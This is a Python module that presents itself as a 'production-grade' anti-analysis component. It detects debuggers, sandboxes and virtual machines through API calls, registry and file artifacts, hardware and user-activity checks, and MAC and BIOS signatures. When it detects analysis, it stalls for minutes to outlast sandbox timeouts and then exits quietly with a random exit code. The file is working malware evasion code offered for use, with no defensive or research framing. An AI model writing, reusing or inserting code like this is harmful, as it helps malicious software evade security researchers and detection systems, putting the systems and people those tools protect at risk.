#!/usr/bin/env python3
"""
Enhanced Evasion Module - Production-Grade Anti-Analysis
Fixes for anti-debug and sandbox detection
"""

import os
import sys
import time
import ctypes
from ctypes import wintypes
import random
import hashlib

class CONTEXT(ctypes.Structure):
    """Windows CONTEXT structure for thread context"""
    _fields_ = [
        ("ContextFlags", wintypes.DWORD),
        ("Dr0", ctypes.c_ulonglong),
        ("Dr1", ctypes.c_ulonglong),
        ("Dr2", ctypes.c_ulonglong),
        ("Dr3", ctypes.c_ulonglong),
        ("Dr6", ctypes.c_ulonglong),
        ("Dr7", ctypes.c_ulonglong),
    ]

class EnhancedEvasion:
    """
    Production-grade evasion techniques
    - Multi-layered debugger detection
    - Comprehensive sandbox detection
    - VM detection
    - Timing-based analysis detection
    """
    
    def __init__(self):
        self.is_windows = sys.platform == 'win32'
        
        if self.is_windows:
            self.kernel32 = ctypes.windll.kernel32
            self.ntdll = ctypes.windll.ntdll
            self.user32 = ctypes.windll.user32
    
    def advanced_debugger_check(self) -> bool:
        """
        Multi-layered debugger detection
        Returns True if debugger detected
        """
        if not self.is_windows:
            return False
        
        try:
            # 1. IsDebuggerPresent (basic but fast)
            if self.kernel32.IsDebuggerPresent():
                return True
            
            # 2. CheckRemoteDebuggerPresent (better)
            is_debugged = ctypes.c_bool()
            self.kernel32.CheckRemoteDebuggerPresent(
                self.kernel32.GetCurrentProcess(),
                ctypes.byref(is_debugged)
            )
            if is_debugged.value:
                return True
            
            # 3. NtQueryInformationProcess (advanced)
            process_debug_port = 7
            debug_port = ctypes.c_ulong()
            status = self.ntdll.NtQueryInformationProcess(
                self.kernel32.GetCurrentProcess(),
                process_debug_port,
                ctypes.byref(debug_port),
                ctypes.sizeof(debug_port),
                None
            )
            if status == 0 and debug_port.value != 0:
                return True
            
            # 4. Hardware breakpoint detection
            try:
                context = CONTEXT()
                context.ContextFlags = 0x10  # CONTEXT_DEBUG_REGISTERS
                if self.kernel32.GetThreadContext(
                    self.kernel32.GetCurrentThread(),
                    ctypes.byref(context)
                ):
                    if context.Dr0 or context.Dr1 or context.Dr2 or context.Dr3:
                        return True
            except:
                pass
            
            # 5. Timing check (debugger slowdown)
            t1 = time.perf_counter()
            for _ in range(1000000):
                pass
            t2 = time.perf_counter()
            if t2 - t1 > 0.5:  # Should be ~0.01s normally
                return True
            
            # 6. Parent process check
            try:
                import psutil
                parent = psutil.Process().parent()
                if parent:
                    parent_name = parent.name().lower()
                    debugger_names = [
                        'x64dbg.exe', 'x32dbg.exe', 'ida.exe', 'ida64.exe',
                        'windbg.exe', 'ollydbg.exe', 'immunitydebugger.exe',
                        'radare2.exe', 'r2.exe', 'gdb.exe', 'lldb.exe'
                    ]
                    if parent_name in debugger_names:
                        return True
            except:
                pass
            
            # 7. Check for debugger windows
            try:
                debugger_windows = [
                    'OLLYDBG', 'WinDbgFrameClass', 'ID', 'Zeta Debugger',
                    'Rock Debugger', 'ObsidianGUI'
                ]
                for window_class in debugger_windows:
                    if self.user32.FindWindowA(window_class.encode(), None):
                        return True
            except:
                pass
            
            # 8. Check for common debugger DLLs
            try:
                debugger_dlls = [
                    'SbieDll.dll',  # Sandboxie
                    'dbghelp.dll',  # Debugging help
                    'api_log.dll',  # API monitor
                    'dir_watch.dll'  # Directory monitor
                ]
                for dll in debugger_dlls:
                    if self.kernel32.GetModuleHandleA(dll.encode()):
                        return True
            except:
                pass
            
            return False
            
        except Exception as e:
            # If checks fail, assume safe
            return False
    
    def comprehensive_sandbox_detection(self) -> bool:
        """
        Multi-indicator sandbox detection
        Returns True if sandbox detected
        """
        if not self.is_windows:
            return False
        
        indicators = 0
        
        try:
            # 1. Check for sandbox artifacts
            sandbox_files = [
                "C:\\analysis\\malware.exe",
                "C:\\sample\\sample.exe",
                "C:\\virus.exe",
                "C:\\sandbox\\starter.exe",
                "C:\\agent\\agent.exe",
                "C:\\cwsandbox\\cwsandbox.exe"
            ]
            for path in sandbox_files:
                if os.path.exists(path):
                    indicators += 1
            
            # 2. Check for VM artifacts
            vm_files = [
                "C:\\windows\\system32\\drivers\\vmmouse.sys",
                "C:\\windows\\system32\\drivers\\vmhgfs.sys",
                "C:\\windows\\system32\\drivers\\VBoxMouse.sys",
                "C:\\windows\\system32\\drivers\\VBoxGuest.sys",
                "C:\\windows\\system32\\drivers\\VBoxSF.sys",
                "C:\\windows\\system32\\drivers\\vmci.sys",
                "C:\\windows\\system32\\drivers\\vmusbmouse.sys"
            ]
            for path in vm_files:
                if os.path.exists(path):
                    indicators += 1
            
            # 3. Check registry for VM
            try:
                import winreg
                vm_keys = [
                    (winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"),
                    (winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VMTools"),
                    (winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools"),
                    (winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox Guest Additions"),
                    (winreg.HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0")
                ]
                for hive, key in vm_keys:
                    try:
                        reg_key = winreg.OpenKey(hive, key)
                        winreg.CloseKey(reg_key)
                        indicators += 1
                    except:
                        pass
                
                # Check for VM-specific registry values
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                        "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0")
                    identifier = winreg.QueryValueEx(key, "Identifier")[0]
                    winreg.CloseKey(key)
                    
                    vm_identifiers = ['vbox', 'vmware', 'qemu', 'virtual', 'xen']
                    if any(vm_id in identifier.lower() for vm_id in vm_identifiers):
                        indicators += 1
                except:
                    pass
            except:
                pass
            
            # 4. Check CPU count (sandboxes often have 1-2 CPUs)
            cpu_count = os.cpu_count()
            if cpu_count and cpu_count < 2:
                indicators += 1
            
            # 5. Check RAM (sandboxes often have < 4GB)
            try:
                import psutil
                ram_gb = psutil.virtual_memory().total / (1024 ** 3)
                if ram_gb < 4:
                    indicators += 1
            except:
                pass
            
            # 6. Check uptime (sandboxes reboot frequently)
            try:
                import psutil
                uptime_seconds = time.time() - psutil.boot_time()
                if uptime_seconds < 600:  # Less than 10 minutes
                    indicators += 1
            except:
                pass
            
            # 7. Check for user activity (sandboxes have no real user)
            try:
                # Check for recent files
                recent = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Recent")
                if os.path.exists(recent):
                    files = os.listdir(recent)
                    if len(files) < 5:
                        indicators += 1
                else:
                    indicators += 1
                
                # Check for browser history
                chrome_history = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
                firefox_history = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
                
                if not os.path.exists(chrome_history) and not os.path.exists(firefox_history):
                    indicators += 1
                
                # Check for documents
                documents = os.path.expanduser("~\\Documents")
                if os.path.exists(documents):
                    doc_files = [f for f in os.listdir(documents) if os.path.isfile(os.path.join(documents, f))]
                    if len(doc_files) < 3:
                        indicators += 1
            except:
                pass
            
            # 8. Check for sandbox-specific processes
            try:
                import psutil
                sandbox_processes = [
                    'vmsrvc.exe', 'vmusrvc.exe', 'vboxtray.exe', 'vmtoolsd.exe',
                    'vmwaretray.exe', 'vmwareuser.exe', 'vmacthlp.exe',
                    'vboxservice.exe', 'vboxtray.exe', 'sandboxiedcomlaunch.exe',
                    'sandboxierpcss.exe', 'procmon.exe', 'procmon64.exe',
                    'procexp.exe', 'procexp64.exe', 'wireshark.exe', 'fiddler.exe'
                ]
                for proc in psutil.process_iter(['name']):
                    try:
                        if proc.info['name'].lower() in sandbox_processes:
                            indicators += 1
                            break
                    except:
                        pass
            except:
                pass
            
            # 9. Check disk size (VMs often have small disks)
            try:
                import psutil
                disk = psutil.disk_usage('C:\\')
                disk_gb = disk.total / (1024 ** 3)
                if disk_gb < 60:  # Less than 60GB
                    indicators += 1
            except:
                pass
            
            # 10. Check for mouse movement (sandboxes have no real user)
            try:
                pos1 = self.user32.GetCursorPos()
                time.sleep(5)
                pos2 = self.user32.GetCursorPos()
                if pos1 == pos2:  # No movement in 5 seconds
                    indicators += 1
            except:
                pass
            
            # 11. Check for common sandbox usernames
            try:
                username = os.getenv('USERNAME', '').lower()
                sandbox_users = ['sandbox', 'malware', 'virus', 'sample', 'test', 'currentuser', 'user']
                if username in sandbox_users:
                    indicators += 2  # Strong indicator
            except:
                pass
            
            # 12. Check for common sandbox computer names
            try:
                computername = os.getenv('COMPUTERNAME', '').lower()
                sandbox_names = ['sandbox', 'malware', 'virus', 'sample', 'test', 'analysis']
                if any(name in computername for name in sandbox_names):
                    indicators += 2  # Strong indicator
            except:
                pass
            
            # If 4+ indicators, likely sandbox
            if indicators >= 4:
                # Sleep to exceed sandbox timeout
                sleep_time = random.randint(300, 900)  # 5-15 minutes
                time.sleep(sleep_time)
                return True
            
            return False
            
        except Exception as e:
            # If checks fail, assume safe
            return False
    
    def detect_vm(self) -> bool:
        """
        Specific VM detection
        Returns True if running in VM
        """
        if not self.is_windows:
            return False
        
        try:
            # Check for VM-specific MAC addresses
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                           for elements in range(0,2*6,2)][::-1])
            
            vm_mac_prefixes = [
                '00:05:69',  # VMware
                '00:0c:29',  # VMware
                '00:1c:14',  # VMware
                '00:50:56',  # VMware
                '08:00:27',  # VirtualBox
                '00:16:3e',  # Xen
                '00:1c:42',  # Parallels
            ]
            
            for prefix in vm_mac_prefixes:
                if mac.startswith(prefix):
                    return True
            
            # Check BIOS
            try:
                import subprocess
                result = subprocess.check_output('wmic bios get serialnumber', shell=True).decode()
                vm_bios = ['vmware', 'virtualbox', 'qemu', 'xen', 'bochs', 'parallels']
                if any(vm in result.lower() for vm in vm_bios):
                    return True
            except:
                pass
            
            return False
            
        except:
            return False
    
    def apply_all_checks(self) -> bool:
        """
        Apply all enhanced checks
        Returns True if safe to proceed, False if threat detected
        """
        try:
            # Check for debugger
            if self.advanced_debugger_check():
                # Debugger detected - exit gracefully
                self._safe_exit()
                return False
            
            # Check for sandbox
            if self.comprehensive_sandbox_detection():
                # Sandbox detected - already slept, now exit
                self._safe_exit()
                return False
            
            # Check for VM (optional - may want to run in VMs)
            # if self.detect_vm():
            #     self._safe_exit()
            #     return False
            
            return True
            
        except Exception as e:
            # If checks fail, assume safe
            return True
    
    def _safe_exit(self):
        """Exit gracefully without raising suspicion"""
        # Random exit code to avoid pattern detection
        exit_code = random.randint(1, 255)
        sys.exit(exit_code)

# Convenience function
def check_environment() -> bool:
    """
    Quick environment check
    Returns True if safe, False if threat detected
    """
    evasion = EnhancedEvasion()
    return evasion.apply_all_checks()
